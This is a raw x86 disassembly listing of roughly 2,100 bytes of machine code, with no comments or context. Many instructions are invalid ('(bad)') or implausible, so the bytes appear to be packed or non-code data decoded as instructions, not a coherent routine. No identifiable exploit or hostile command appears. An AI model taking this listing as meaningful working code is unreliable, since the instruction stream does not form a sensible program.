  432122:	test   DWORD PTR [ebx+0xff7cff],ecx
  432128:	inc    eax
  432129:	mov    DWORD PTR [eax],eax
  43212b:	mov    esp,DWORD PTR [esi-0x4]
  43212e:	inc    ebp
  43212f:	cmp    BYTE PTR [eax+0x4701],0x38
  432136:	mov    DWORD PTR [ebp-0x7e],ebp
  432139:	add    BYTE PTR [edi-0x73],al
  43213c:	push   0xffffffcd
  43213e:	mov    WORD PTR [ebp+0x64],ax
  432142:	(bad)  
  432143:	call   eax
  432145:	mov    esp,esi
  432147:	data16 cmc 
  432149:	test   DWORD PTR [ebp-0x1],eax
  43214c:	(bad)  
  43214e:	out    0xc0,eax
  432150:	lea    esp,[esi-0x30]
  432153:	test   DWORD PTR [edx+0x44ff80ff],ecx
  432159:	inc    edi
  43215a:	jmp    0x75ff:0x40858866
  432161:	dec    DWORD PTR [ebp-0x7a992f40]
  432167:	test   esi,edi
  432169:	(bad)  
  43216a:	(bad)  
  43216b:	inc    DWORD PTR [ebp-0x9901b9]
  432171:	test   DWORD PTR [ebx+0x51fff4ff],ecx
  432177:	rcl    BYTE PTR [ecx+0x66],0x33
  43217b:	test   DWORD PTR [ebx+0xff72ff],edi
  432181:	inc    edi
  432182:	ret    
  432183:	mov    ax,WORD PTR [ebp-0x3f0004]
  43218a:	push   eax
  43218b:	mov    DWORD PTR [ebp-0x77],0xff98748b
  432192:	add    BYTE PTR [ebx-0x764f0839],al
  432198:	push   DWORD PTR [esi+0x1]
  43219b:	inc    DWORD PTR [eax]
  43219d:	mov    eax,0xff99ff
  4321a2:	or     BYTE PTR [ecx-0x7a87bb],cl
  4321a8:	jne    0x432162
  4321aa:	add    DWORD PTR [edx-0x76edff74],0xff707a8d
  4321b4:	mov    ecx,0xd74fb8
  4321b9:	add    cl,al
  4321bb:	mov    DWORD PTR [ecx-0x3f007784],ecx
  4321c1:	or     DWORD PTR [ebx+0x558966e4],0x7e
  4321c8:	(bad)  
  4321c9:	(bad)  
  4321ca:	std    
  4321cb:	mov    eax,0x8c2789
  4321d0:	ret    0x6689
  4321d3:	adc    BYTE PTR [ebp+0x40],0x8d
  4321d7:	add    bh,ah
  4321d9:	mov    WORD PTR [ebp-0x70],ax
  4321dd:	(bad)  
  4321de:	ret    0x6605
  4321e1:	or     BYTE PTR [ebp-0x77],dl
  4321e4:	lea    eax,[ecx+eiz*8-0x6b1676bb]
  4321eb:	loop   0x432176
  4321ed:	(bad)  
  4321ee:	xchg   esi,eax
  4321ef:	aam    0xcf
  4321f1:	out    dx,al
  4321f2:	mov    DWORD PTR [esi-0x68],edi
  4321f5:	inc    ebp
  4321f6:	dec    edx
  4321f7:	pop    ecx
  4321f8:	mov    edx,DWORD PTR [eax]
  4321fa:	repnz push bp
  4321fd:	or     BYTE PTR [ebx+0x5510663a],0x49
  432204:	(bad)  
  432205:	repnz cmp eax,0xa0898945
  43220b:	mov    ah,0x89
  43220d:	jmp    DWORD PTR [edx+0x66b0418d]
  432213:	inc    DWORD PTR [ebp+0x50]
  432216:	add    DWORD PTR [ebp+0x3],0xffffffbe
  43221a:	mov    DWORD PTR [eax],ecx
  43221c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43221d:	pop    es
  43221e:	inc    ecx
  43221f:	(bad)  
  432220:	cwd    
  432222:	inc    ebp
  432223:	xor    ah,BYTE PTR [esi+0x3]
  432226:	dec    ebp
  432227:	push   eax
  432228:	inc    bp
  43222a:	jge    0x4321af
  43222c:	mov    esp,DWORD PTR [esi-0x18]
  43222f:	mov    esi,DWORD PTR [edi+0x7d809cfc]
  432235:	add    DWORD PTR [ebx],esi
  432237:	add    BYTE PTR [ebx],al
  432239:	test   DWORD PTR [ebx],esi
  43223b:	(bad)  
  43223c:	inc    WORD PTR [ebp+0x0]
  432240:	mov    eax,DWORD PTR [eax]
  432242:	call   0x8898d977
  432247:	mov    esi,eax
  432249:	clc    
  43224a:	ret    
  43224b:	rol    cl,0xa
  43224e:	mov    DWORD PTR ds:0x7c0ec88,esi
  432254:	mov    edx,edi
  432256:	pushf  
  432257:	pop    es
  432258:	jmp    DWORD PTR [edx+0x66]
  43225b:	add    BYTE PTR [ebp-0x990175],al
  432261:	inc    ebp
  432262:	test   DWORD PTR [ebx-0x2f00ea02],eax
  432268:	push   ebp
  432269:	mov    edi,eax
  43226b:	mov    dh,BYTE PTR [eax+0x266ff51]
  432271:	push   ebp
  432272:	add    BYTE PTR [ebx-0x764b0777],al
  432278:	dec    DWORD PTR [esi+0x661851e8]
  43227e:	add    BYTE PTR [ebp-0x7b],dl
  432281:	cmp    esi,0x3
  432284:	dec    DWORD PTR [ecx+0x51fe9285]
  43228a:	jmp    DWORD PTR [esi-0x75]
  43228d:	push   ebp
  43228e:	hlt    
  43228f:	data16 (bad) 
  432291:	dec    ebp
  432292:	ret    
  432293:	mov    ecx,DWORD PTR [ebp-0xb29b9a]
  432299:	lea    edx,[eax-0x1]
  43229c:	jne    0x43226f
  43229e:	dec    DWORD PTR [ecx-0x2f7a63f8]
  4322a4:	dec    BYTE PTR [ecx+0x51559eff]
  4322aa:	mov    DWORD PTR [esi-0x4c],esp
  4322ad:	push   ebp
  4322ae:	jmp    DWORD PTR [esi-0x18]
  4322b1:	inc    ebp
  4322b2:	sbb    BYTE PTR [ebp-0x767ad900],cl
  4322b8:	(bad)  
  4322b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4322ba:	inc    eax
  4322bc:	test   DWORD PTR [esi-0x2],esp
  4322bf:	inc    ebp
  4322c0:	dec    DWORD PTR [ebp-0x760bde75]
  4322c6:	(bad)  
  4322c7:	test   al,0xc3
  4322c9:	mov    DWORD PTR [ebp-0x769b56],ecx
  4322cf:	lods   al,BYTE PTR ds:[esi]
  4322d0:	push   eax
  4322d1:	inc    ebp
  4322d2:	jne    0x4322e3
  4322d4:	dec    DWORD PTR [ebp+0x8]
  4322d7:	mov    eax,DWORD PTR [edi]
  4322d9:	sbb    al,0x0
  4322db:	(bad)  
  4322dc:	mov    eax,0xc14fc3
  4322e1:	mov    DWORD PTR [eax-0x64],edi
  4322e4:	inc    bp
  4322e6:	test   DWORD PTR [edi],ecx
  4322e8:	dec    DWORD PTR [ebp-0x1]
  4322eb:	xor    eax,edi
  4322ed:	add    ecx,DWORD PTR [ecx-0x99bdcd]
  4322f3:	inc    ebp
  4322f4:	xor    DWORD PTR [ebx],0x43
  4322f7:	mov    WORD PTR [ebp-0x1bc],ax
  4322fe:	lea    ecx,[ecx-0x7677fe]
  432304:	inc    esi
  432305:	(bad)  
  432306:	call   FWORD PTR [ebp+ecx*4-0x3e72be01]
  43230d:	pushf  
  43230e:	rol    DWORD PTR [ebp-0x72019a],0xff
  432315:	add    bh,bh
  432317:	add    BYTE PTR [edi],cl
  432319:	test   DWORD PTR [eax],eax
  43231b:	(bad)  
  43231c:	dec    WORD PTR [ebp-0xff002d]
  432323:	mov    DWORD PTR [eax-0x48],esi
  432326:	add    bh,bh
  432328:	lea    cx,[ebp-0x50]
  43232f:	push   eax
  432330:	rol    BYTE PTR [ebp+0x0],1
  432333:	xor    esp,DWORD PTR [esi+0x3]
  432336:	lea    edx,[eax-0x1]
  432339:	test   edi,edi
  43233b:	dec    DWORD PTR [ebp-0x1]
  43233e:	mov    edi,edi
  432340:	dec    eax
  432341:	clc    
  432342:	call   DWORD PTR [ebp-0x73]
  432345:	lea    esi,[eax+0x51ffff88]
  43234b:	lea    ecx,[ebp-0x78]
  43234e:	test   WORD PTR [ebp-0x2],ax
  432355:	popf   
  432356:	push   ecx
  432357:	add    BYTE PTR [ecx-0x77],dl
  43235a:	xor    edi,DWORD PTR [eax-0x724a007d]
  432360:	cdq    
  432361:	mov    al,0x32
  432363:	inc    DWORD PTR [ebx]
  432365:	push   eax
  432366:	push   ecx
  432367:	inc    ebp
  432368:	shl    BYTE PTR [ebx],1
  43236a:	lea    eax,[ebx]
  43236c:	call   DWORD PTR [eax-0x1]
  43236f:	test   DWORD PTR [ebx],esi
  432371:	inc    DWORD PTR [eax-0x1]
  432374:	(bad)  
  432375:	(bad)  
  432376:	(bad)  
  432377:	clc    
  432378:	call   DWORD PTR [ebp+0x50]
  43237b:	jmp    0xcc24f5
  432380:	inc    esp
  432381:	jae    0x432382
  432383:	add    BYTE PTR [ecx-0x384f73],cl
  432389:	mov    DWORD PTR [ebx-0x7f0003c0],ecx
  43238f:	mov    eax,DWORD PTR [ecx]
  432391:	data16 add BYTE PTR [ebp-0xb50077],al
  432398:	inc    eax
  43239a:	lea    esp,[esi+0x1c]
  43239d:	test   DWORD PTR [ecx-0xb301],ecx
  4323a3:	inc    edi
  4323a4:	(bad)  
  4323a5:	dec    si
  4323a7:	test   edi,edi
  4323a9:	push   DWORD PTR [ecx]
  4323ab:	(bad)  
  4323ac:	jnp    0x4323fd
  4323ae:	(bad)  
  4323af:	mov    edx,DWORD PTR [edx-0x7d]
  4323b2:	(bad)  
  4323b3:	mov    ebx,0x563a8935
  4323b8:	(bad)  
  4323b9:	call   FWORD PTR [esi-0x47]
  4323bc:	inc    DWORD PTR ds:0x893000e2
  4323c2:	(bad)  
  4323c3:	pop    eax
  4323c4:	mov    ah,0xff
  4323c6:	(bad)  
  4323c7:	mov    ecx,0x5745
  4323cc:	dec    DWORD PTR [ecx-0xf7a501]
  4323d2:	(bad)  
  4323d3:	mov    ecx,0x456108
  4323d8:	mov    ecx,DWORD PTR [ecx-0x3fa3e4]
  4323de:	test   BYTE PTR [ebp-0x72ff23fd],cl
  4323e4:	inc    BYTE PTR gs:[eax]
  4323e7:	inc    DWORD PTR [ebp-0x73]
  4323ea:	ss (bad) 
  4323ec:	pushf  
  4323ed:	inc    edi
  4323ef:	mov    ebx,eax
  4323f1:	hlt    
  4323f2:	test   DWORD PTR [ecx-0xbab708],ecx
  4323f8:	cmp    bh,BYTE PTR [esi+0x7c7089c]
  4323fe:	lock into 
  432400:	test   eax,eax
  432402:	clc    
  432403:	mov    ebx,0x367245
  432408:	lahf   
  432409:	retf   
  43240a:	mov    ecx,DWORD PTR [ebx+0x40808dfc]
  432410:	add    edi,edi
  432412:	add    BYTE PTR [ecx+0x45],dl
  432415:	ror    BYTE PTR [ebx+0x4d44fc8d],0xff
  43241c:	mov    edx,DWORD PTR [ecx-0x74]
  43241f:	inc    DWORD PTR [eax]
  432421:	cld    
  432422:	mov    eax,DWORD PTR [ebp-0x6f0175]
  432428:	add    BYTE PTR [ebp-0x1b0177],al
  43242e:	jge    0x432475
  432430:	test   DWORD PTR [ebx+0xff9875],ecx
  432436:	sbb    BYTE PTR [esi+0x55],ah
  432439:	xchg   ebp,eax
  43243a:	call   0x431f3e
  43243f:	push   edi
  432440:	inc    ebp
  432441:	mov    dx,WORD PTR [ebp-0xfc0075]
  432448:	cmp    al,0x85
  43244a:	ud0    eax,DWORD PTR [ebp-0x1]
  43244e:	test   DWORD PTR [edi+0x74],ecx
  432451:	dec    edi
  432452:	inc    DWORD PTR [ebp-0xf70004]
  432458:	dec    DWORD PTR [edi-0x75]
  43245b:	dec    edi
  43245c:	cld    
  43245d:	test   DWORD PTR [eax+0xff01ff],eax
  432463:	icebp  
  432464:	add    BYTE PTR [edi-0x3a],cl
  432467:	test   ebx,eax
  432469:	inc    BYTE PTR [ebp-0x1]
  43246c:	jne    0x43246e
  43246e:	mov    eax,DWORD PTR [eax]
  432470:	cld    
  432471:	xor    BYTE PTR [ecx+0x500155],cl
  432477:	push   ebp
  432478:	xor    DWORD PTR [ecx+0x45011c80],ecx
  43247e:	add    BYTE PTR [ebp+0x35e90f50],al
  432484:	add    al,BYTE PTR [eax]
  432486:	add    BYTE PTR [ebx-0x38fe4f80],al
  43248c:	add    ah,ch
  43248e:	or     BYTE PTR [ebp+0x4501f845],dh
  432494:	jmp    0xdf278f
  432499:	(bad)  
  43249a:	nop    ecx
  43249d:	test   DWORD PTR [ebp+0x4502f8],eax
  4324a3:	cmp    BYTE PTR [ebp-0x64],cl
  4324a6:	mov    eax,edi
  4324a8:	mov    ebx,DWORD PTR [eax+edx*2]
  4324ab:	add    eax,0x45fef885
  4324b0:	dec    DWORD PTR [ebx+0x339445]
  4324b6:	add    ecx,DWORD PTR [ecx+0x4500f889]
  4324bc:	dec    DWORD PTR [ebx-0x460f0375]
  4324c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4324c3:	add    esi,edi
  4324c5:	add    bh,bh
  4324c7:	rdpmc  
  4324c9:	add    BYTE PTR [ebx],0x1
  4324cc:	mov    DWORD PTR [eax],eax
  4324ce:	add    al,0x45
  4324d0:	dec    DWORD PTR [ecx-0x360b3373]
  4324d6:	dec    DWORD PTR [esi]
  4324d8:	push   eax
  4324d9:	jne    0x432520
  4324db:	mov    esi,DWORD PTR [ebx]
  4324dd:	cld    
  4324de:	add    ebp,ebx
  4324e0:	push   eax
  4324e1:	inc    DWORD PTR [ebp-0x75]
  4324e4:	add    eax,0x800e4
  4324e9:	add    BYTE PTR [ebx-0x7f7403bf],cl
  4324ef:	mov    DWORD PTR [ecx],eax
  4324f1:	sbb    al,0x0
  4324f3:	leave  
  4324f4:	test   DWORD PTR [edi-0x2],eax
  4324f7:	jne    0x4324f8
  4324f9:	call   0xff440ffe
  4324fe:	xor    BYTE PTR [ebp+0x4d],al
  432501:	mov    edi,edi
  432503:	enter  0x8,0x4d
  432507:	mov    ecx,DWORD PTR [ebx-0x7fc74cd]
  43250d:	mov    eax,DWORD PTR [eax]
  43250f:	cld    
  432510:	add    DWORD PTR [ecx],ebx
  432512:	inc    ebp
  432513:	dec    ebp
  432514:	mov    DWORD PTR [ebx+0x1ccc8b],ecx
  43251a:	inc    eax
  43251b:	dec    DWORD PTR [ecx-0x270375]
  432521:	add    BYTE PTR [ebx-0x39d72701],cl
  432527:	xchg   ecx,eax
  432528:	ret    
  432529:	add    BYTE PTR [ebp-0x830075],al
  43252f:	add    BYTE PTR [ebp-0x75],al
  432532:	mov    DWORD PTR [ebp+0x8ff0404],ecx
  432538:	lea    edi,[edi-0xc]
  43253b:	add    bh,bh
  43253d:	mov    edx,DWORD PTR [eax-0x7b]
  432540:	inc    ebp
  432541:	rdpmc  
  432543:	jne    0x432548
  432545:	add    BYTE PTR [eax-0x75],dl
  432548:	inc    ebp
  432549:	clc    
  43254a:	add    eax,0x400009
  43254f:	mov    DWORD PTR [ebx-0x7f000304],ecx
  432555:	mov    eax,DWORD PTR [ecx]
  432557:	in     al,dx
  432558:	add    dh,al
  43255a:	test   ebx,eax
  43255c:	inc    BYTE PTR [ebp-0xff0001]
  432562:	add    BYTE PTR [ebp-0x43],al
  432565:	cmp    esi,0xfffffff8
  432568:	(bad)  
  432569:	push   DWORD PTR [eax]
  43256b:	add    BYTE PTR [ebp-0x3a],dl
  43256e:	test   ebx,eax
  432570:	je     0x4324f7
  432572:	mov    edi,edi
  432574:	sbb    al,0xff
  432576:	test   DWORD PTR gs:[eax],eax
  432579:	(bad)  
  43257a:	js     0x43257b
  43257c:	add    BYTE PTR [ebx-0x39b20bdd],cl
  432582:	sub    eax,ebx
  432584:	mov    ecx,DWORD PTR [ebx-0x55130377]
  43258a:	add    eax,DWORD PTR [eax]
  43258c:	dec    ebp
  43258d:	push   eax
  43258e:	mov    al,BYTE PTR [ebp+0x1]
  432591:	mov    eax,DWORD PTR [ebp-0x68]
  432594:	mov    eax,DWORD PTR [eax]
  432596:	sbb    bh,al
  432598:	or     ah,dh
  43259a:	dec    ebp
  43259b:	inc    DWORD PTR [eax+0x4]
  43259e:	push   ecx
  43259f:	add    BYTE PTR [edx-0x1],dh
  4325a2:	mov    ecx,DWORD PTR [ecx+0x55cfe83c]
  4325a8:	or     DWORD PTR [ebx-0x7ff3400],0x8b5545d7
  4325b2:	add    ecx,DWORD PTR [ecx-0x1be77477]
  4325b8:	push   ecx
  4325b9:	cmp    BYTE PTR [ebx],al
  4325bb:	inc    ebp
  4325bc:	mov    DWORD PTR [ebx-0x7aaaafe4],ecx
  4325c2:	(bad)  
  4325c3:	(bad)  
  4325c4:	in     al,0xff
  4325c6:	add    BYTE PTR [ebp+0x0],al
  4325c9:	xor    eax,DWORD PTR [eax-0x7c76fffd]
  4325cf:	add    al,bh
  4325d1:	(bad)  
  4325d2:	jmp    0x8d85:0x74b0558d
  4325d9:	dec    DWORD PTR [eax]
  4325db:	call   DWORD PTR [ebp-0x7b]
  4325de:	mov    edi,esi
  4325e0:	lock call DWORD PTR [ebp-0x75]
  4325e4:	mov    esi,esp
  4325e6:	mov    ah,0xc6
  4325e8:	mov    bh,0xc3
  4325ea:	mov    DWORD PTR [ebx-0x110003c4],ecx
  4325f0:	add    DWORD PTR [eax],0x450050ff
  4325f6:	mov    DWORD PTR [ebx+0x9598cc],ecx
  4325fc:	inc    edi
  4325fe:	push   esp
  432600:	jmp    0xcd00:0x670481ff
  432607:	mov    DWORD PTR [ebx],esi
  432609:	clc    
  43260a:	cmp    edi,0xff9cff3b
  432610:	jne    0x43261a
  432612:	mov    eax,eax
  432614:	add    esi,DWORD PTR [eax]
  432616:	int3   
  432617:	inc    ebp
  432618:	cmp    al,0x83
  43261a:	add    BYTE PTR [eax],bl
  43261c:	adc    DWORD PTR [ebx+0x768b5055],eax
  432622:	add    ecx,DWORD PTR [ebx-0x30ba17c7]
  432628:	mov    edi,eax
  43262a:	cmp    BYTE PTR [ebp+0x45],cl
  43262d:	jmp    0x4325ba
  43262f:	mov    ebx,DWORD PTR [esp+ebp*8]
  432632:	inc    ebp
  432633:	or     al,0x2
  432635:	dec    DWORD PTR [ebp+0x18]
  432638:	jne    0x43268f
  43263a:	mov    ecx,DWORD PTR [eax+0x1c558bf8]
  432640:	mov    edi,DWORD PTR [ebx]
  432642:	in     al,0x50
  432644:	xchg   ecx,eax
  432645:	jmp    0x343754a
  43264a:	adc    al,0x8b
  43264c:	inc    ebp
  43264d:	mov    al,ds:0x8b04008b
  432652:	push   ebp
  432653:	sub    ecx,DWORD PTR [ecx-0x2d381318]
  432659:	push   ebp
  43265a:	test   DWORD PTR [ebx-0x2800d701],ecx
  432660:	inc    ebp
  432661:	dec    ebp
  432662:	mov    DWORD PTR [ecx+0x45ffb8f8],ecx
  432668:	mov    DWORD PTR [eax],0xe9ff00f4
  43266e:	add    al,0x0
  432670:	add    BYTE PTR [eax],al
  432672:	mov    eax,edx
  432674:	push   eax
  432675:	rol    DWORD PTR [ebp-0xf0177],1
  43267b:	bound  eax,QWORD PTR [ebp+0x50]
  43267e:	xor    ecx,DWORD PTR [ecx+0x5589b403]
  432684:	add    BYTE PTR [ecx+0x558df0ff],cl
  43268a:	mov    al,0xf
  43268c:	test   DWORD PTR [edx],edx
  43268e:	call   DWORD PTR [ebp-0x7a0001]
  432694:	(bad)  
  432695:	loop   0x432696
  432697:	jnp    0xc6991a9d
  43269d:	mov    eax,ebx
  43269f:	cmp    al,0x8b
  4326a1:	(bad)  
  4326a2:	cld    
  4326a3:	shr    esi,0xc
  4326a6:	add    dl,al
  4326a8:	push   eax
  4326a9:	lea    eax,[ebp-0x1]
  4326ac:	mov    edx,esi
  4326ae:	cwde   
  4326af:	cli    
  4326b0:	add    BYTE PTR [ebp+0x1ffff8ff],al
  4326b6:	or     BYTE PTR [eax],cl
  4326b8:	inc    ebp
  4326b9:	dec    ebp
  4326ba:	inc    DWORD PTR [ebx+0x74803914]
  4326c0:	add    DWORD PTR [ebx+0x451800],ecx
  4326c6:	call   DWORD PTR [eax+edx*1]
  4326c9:	add    ecx,DWORD PTR [ebp-0x34]
  4326cc:	push   edi
  4326cd:	adc    al,0x8
  4326cf:	mov    edx,DWORD PTR [ebp-0x14]
  4326d2:	mov    ecx,DWORD PTR [ebp+0x18]
  4326d5:	add    DWORD PTR [ebp-0x4c],0xffffff8d
  4326d9:	inc    DWORD PTR [eax+esi*8]
  4326dc:	inc    ebp
  4326dd:	stos   BYTE PTR es:[edi],al
  4326de:	mov    edx,DWORD PTR [ebp-0x4]
  4326e1:	add    DWORD PTR [ebp-0x1c],eax
  4326e4:	mov    edx,DWORD PTR [ebp-0x70]
  4326e7:	cmp    eax,DWORD PTR [eax]
  4326e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4326ea:	mov    eax,DWORD PTR [eax]
  4326ec:	cld    
  4326ed:	jae    0x43266f
  4326ef:	add    eax,DWORD PTR [ecx]
  4326f1:	clc    
  4326f2:	add    BYTE PTR [eax+0x30],dl
  4326f5:	mov    DWORD PTR [ecx],esi
  4326f7:	clc    
  4326f8:	pop    ds
  4326f9:	inc    ebp
  4326fa:	xor    al,BYTE PTR [ebp+0x6f760f3a]
  432700:	(bad)  
  432701:	push   DWORD PTR [edi]
  432703:	mov    ecx,DWORD PTR [ebx+0x398503e8]
  432709:	(bad)  
  43270a:	jae    0x43270b
  43270c:	mov    eax,DWORD PTR [ebp-0x740175]
  432712:	sub    eax,DWORD PTR [eax]
  432714:	add    eax,DWORD PTR [eax]
  432716:	mov    DWORD PTR [ecx+0x5f],eax
  432719:	mov    DWORD PTR [ebx-0x4],ebx
  43271c:	ret    0xff
  43271f:	mov    ecx,DWORD PTR [ebx+0x1cc683d8]
  432725:	ret    
  432726:	mov    eax,DWORD PTR [ebp-0x6f0075]
  43272c:	add    BYTE PTR [ebp-0x7d],al
  43272f:	mov    DWORD PTR [eax],eax
  432731:	add    al,0x84
  432733:	inc    DWORD PTR [ecx]
  432735:	lea    eax,[eax]
  432737:	hlt    
  432738:	sar    bh,cl
  43273a:	test   BYTE PTR [eax+0x1],dl
  43273d:	inc    ebp
  43273e:	add    BYTE PTR [ebx],dh
  432740:	test   BYTE PTR [ebx],0x84
  432743:	push   eax
  432744:	add    BYTE PTR [ebp+0x0],al
  432747:	add    eax,0x86
  43274c:	add    BYTE PTR [ebx-0x7f7b0340],cl
  432752:	add    BYTE PTR [ecx],al
  432754:	add    BYTE PTR [eax],al
  432756:	mov    esi,0x550030
  43275b:	mov    ecx,DWORD PTR [edi]
  43275d:	cld    
  43275e:	fidiv  DWORD PTR [ebp+0x0]
  432761:	mov    edi,DWORD PTR [ecx]
  432763:	xor    BYTE PTR [eax+eax*1],0x84
  432767:	add    eax,DWORD PTR [eax]
  432769:	sbb    BYTE PTR [eax],al
  43276b:	jne    0x43271e
  43276d:	mov    eax,DWORD PTR [ecx]
  43276f:	sbb    BYTE PTR [eax],al
  432771:	mov    DWORD PTR [ebp-0x1],esp
  432774:	add    BYTE PTR [eax+0x30e45ca],bh
  43277a:	ret    0xb7fc
  43277d:	dec    ebp
  43277e:	or     al,0x89
  432780:	dec    ebp
  432781:	cld    
  432782:	cmovne ecx,DWORD PTR [eax-0x75]
  432786:	add    edi,esp
  432788:	seto   BYTE PTR [esi-0x72ffffff]
  43278f:	inc    ebp
  432790:	adc    al,0x8b
  432792:	mov    DWORD PTR [eax+ebp*8-0x740100],ecx
  432799:	cmp    DWORD PTR [edi+0x72],edx
  43279c:	xor    DWORD PTR [ebx-0x74ee7481],ecx
  4327a2:	gs cmp al,0x0
  4327a5:	je     0x43277d
  4327a7:	push   eax
  4327a8:	sar    BYTE PTR [eax],1
  4327aa:	mov    bh,0x3e
  4327ac:	push   cs
  4327ad:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  4327b3:	add    DWORD PTR [ecx+0x12],ebp
  4327b6:	dec    edx
  4327b7:	(bad)  
  4327b8:	mov    eax,edx
  4327ba:	in     al,dx
  4327bb:	adc    DWORD PTR [ecx],esi
  4327bd:	pop    esi
  4327be:	inc    ecx
  4327bf:	leave  
  4327c0:	or     DWORD PTR [eax],ebx
  4327c2:	gs push ebp
  4327c4:	add    ah,ch
  4327c6:	into   
  4327c7:	in     al,dx
  4327c8:	enter  0xb756,0xf0
  4327cc:	push   cs
  4327cd:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
  4327d7:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  4327dd:	jnp    0x7443ace5
  4327e3:	test   DWORD PTR [ebx+0x1cfae40f],ecx
  4327e9:	add    BYTE PTR [edi],cl
  4327eb:	mov    edi,DWORD PTR [ecx-0x78]
  4327ee:	ltr    WORD PTR [ecx-0x7b]
  4327f2:	dec    DWORD PTR [edi]
  4327f4:	clc    
  4327f5:	out    0x45,eax
  4327f7:	add    BYTE PTR [eax],cl
  4327f9:	cmp    ebx,0xffffff8c
  4327fc:	jge    0x4327fe
  4327fe:	jb     0x432810
  432800:	je     0x522880
  432806:	pop    edx
  432807:	push   esi
  432808:	mov    ecx,DWORD PTR [edi]
  43280a:	in     al,dx
  43280b:	rol    DWORD PTR [ebp+0x0],1
  43280e:	or     DWORD PTR [ebx+0xfb8c08],0x4d
  432815:	cmp    DWORD PTR [ecx],0xfffffff0
  432818:	hlt    
  432819:	mov    esp,DWORD PTR [eax+0xf034d2b]
  43281f:	(bad)  
  432821:	push   eax
  432822:	jns    0xb8430ca0
  432828:	lock push cs
  43282a:	ror    edx,0x3
  43282d:	test   BYTE PTR [ecx+0x5500e800],cl
  432833:	dec    eax
  432834:	rcpps  xmm4,XMMWORD PTR [ecx+0x4d]
  432838:	(bad)  
  432839:	mov    esi,0x7f33ff5f
  43283e:	inc    eax
  43283f:	test   DWORD PTR [edx],eax
  432841:	je     0x432803
  432843:	mov    ecx,ecx
  432845:	adc    DWORD PTR [ebp-0xc],0xffffffec
  432849:	and    eax,DWORD PTR [eax+0xf0103]
  43284f:	jp     0x43283d
  432851:	rcpps  xmm3,XMMWORD PTR [edx-0x25]
  432855:	add    edx,DWORD PTR [edi+0x74]
  432858:	sbb    BYTE PTR [ebp+0x4d001484],cl
  43285e:	add    BYTE PTR [ebp-0x74c48bbb],al
  432864:	je     0x4327e9
  432866:	cmp    eax,edi
  432868:	js     0x43288d
  43286a:	add    eax,0xeb0fc003
  43286f:	jns    0x4327fc
  432871:	vmread DWORD PTR [ecx+0x45],ebx
  432875:	add    ecx,DWORD PTR [ebx+0x508d1c74]
  43287b:	adc    al,0x8b
  43287d:	jge    0x432893
  43287f:	mov    edi,DWORD PTR [eax-0x4]
  432882:	add    edi,DWORD PTR [edi]
  432884:	or     bh,bh
  432886:	push   ebp
  432887:	push   es
  432888:	mov    DWORD PTR [ebp-0x4],ebx
  43288b:	add    edi,esi
  43288d:	pop    es
  43288e:	add    esi,DWORD PTR [edi-0x48ccf183]
  432894:	mov    DWORD PTR [esp+esi*8],ecx
  432897:	inc    ebp
  432898:	pop    ebp
  432899:	xor    DWORD PTR [esi-0x4],0x3b
  43289d:	add    edx,DWORD PTR [ecx+edi*1]
  4328a0:	push   es
  4328a1:	clc    
  4328a2:	mov    bh,0xdb
  4328a4:	jp     0x43285d
  4328a6:	add    cl,BYTE PTR [esi]
  4328a8:	div    DWORD PTR [edi+0x4d8b0c1c]
  4328ae:	test   edi,edi
  4328b0:	je     0x4328a6
  4328b2:	mov    eax,ecx
  4328b4:	or     BYTE PTR [ebx],al
  4328b6:	dec    BYTE PTR [ecx+0x7d3bec7d]
  4328bc:	jbe    0x432930
  4328be:	mov    ecx,DWORD PTR [ebx-0x488017f4]
  4328c4:	add    ecx,DWORD PTR [esi]
  4328c6:	cmp    DWORD PTR [edi+0x45fe0cf8],esi
  4328cc:	add    eax,DWORD PTR [ebx-0x287af783]
  4328d2:	je     0x432921
  4328d4:	mov    DWORD PTR [ecx],edi
  4328d6:	mov    esi,eax
  4328d8:	hlt    
  4328d9:	or     BYTE PTR [ecx+0x7dfff4ff],0x5b
  4328e0:	jb     0x4328a2
  4328e2:	jmp    0x4328cf
  4328e4:	xor    esi,DWORD PTR [ebx]
  4328e6:	pop    edi
  4328e7:	pop    esi
  4328e8:	pop    ebx
  4328e9:	ret    
  4328ea:	ret    0x8b
  4328ed:	mov    ecx,DWORD PTR [ebx+0x2c008390]
  4328f3:	xor    DWORD PTR [esi],0xc
  4328f6:	pushf  
  4328f7:	xor    ecx,DWORD PTR [ecx+0x4539fc56]
  4328fd:	(bad)  
  4328ff:	test   DWORD PTR [eax+eax*1+0xcfc8b8b],ebx
  432906:	dec    ebp
  432907:	ret    
  432908:	mov    edi,DWORD PTR [esi-0x4]
  43290b:	pop    eax
  43290c:	dec    ebp
  43290d:	jne    0x43289a
  43290f:	xor    edi,esp
  432911:	inc    eax
  432912:	dec    ebp
  432913:	jbe    0x432968
  432915:	inc    eax
  432916:	pop    ebp
  432917:	add    edx,DWORD PTR [esi+0x8]
  43291a:	push   ecx
  43291b:	dec    eax
  43291c:	push   ecx
  43291d:	mov    eax,edi
  43291f:	and    al,0xf0
  432921:	jo     0x43290e
  432923:	mov    eax,DWORD PTR [ebx]
  432925:	sbb    BYTE PTR [ebp+0x4d],cl
  432928:	mov    eax,DWORD PTR [ebx]
  43292a:	nop
  43292b:	or     BYTE PTR [eax],al
  43292d:	jne    0x432986
  43292f:	cmp    ebx,DWORD PTR [ecx+0x33893277]
  432935:	cld    
  432936:	xor    edi,edi
  432938:	add    edi,DWORD PTR [ebp+0x3]
  43293b:	cmp    DWORD PTR [ecx+0xbcfe8fc],ecx
  432941:	js     0x4328c7
  432943:	jae    0x432947
  432945:	(bad)  
  432947:	xor    al,0x5d
  432949:	jmp    0x4328d6
  43294b:	mov    ecx,DWORD PTR [ecx*4+0x33dfb1de]
  432952:	fdecstp 
  432954:	test   BYTE PTR [edi],ah
  432956:	add    bh,BYTE PTR [ebp+0x0]
  432959:	add    ebx,DWORD PTR [ebp-0x77]
  43295c:	mov    edi,eax
  43295e:	cmp    al,0x0
  432961:	adc    dh,BYTE PTR [ebx]
  432963:	jge    0x432968
  432965:	mov    edi,DWORD PTR [ebx]
  432967:	jl     0x432978
  432969:	clc    
  43296a:	dec    edi
  43296b:	jge    0x43296d
  43296d:	mov    eax,DWORD PTR [ebx]
